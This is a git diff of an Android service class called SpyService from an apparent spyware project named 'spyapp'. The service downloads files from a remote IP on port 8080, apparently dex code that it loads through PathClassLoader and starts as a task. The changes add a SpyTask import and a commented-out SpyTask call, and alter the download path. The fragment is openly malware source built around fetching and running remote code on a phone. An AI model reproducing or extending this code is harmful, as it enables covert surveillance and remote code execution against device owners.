@@ -12,12 +12,12 @@ import androidx.annotation.Nullable;
 import androidx.core.app.JobIntentService;
 import androidx.core.app.NotificationCompat;
 import com.example.spyapp.dex.DexTask;
+import com.example.spyapp.dex.SpyTask;
 import dalvik.system.PathClassLoader;
 
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.concurrent.ExecutionException;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
@@ -63,6 +63,7 @@ public class SpyService extends JobIntentService {
         } catch (Exception e) {
             logger.info(e.getMessage());
         }
+//        dexTask = new SpyTask(getBaseContext(), IP);
         if (null != dexTask) dexTask.start();
 
         return super.onStartCommand(intent, flags, startId);
@@ -96,7 +97,7 @@ public class SpyService extends JobIntentService {
 
         try {
             logger.info("download started.");
-            connection = (HttpURLConnection) (new URL("http://" + IP + ":8080/" + filename).openConnection());
+            connection = (HttpURLConnection) (new URL("http://" + IP + ":8080/downloads/" + filename).openConnection());
             connection.connect();
 
             InputStream inputStream = new BufferedInputStream(connection.getInputStream());
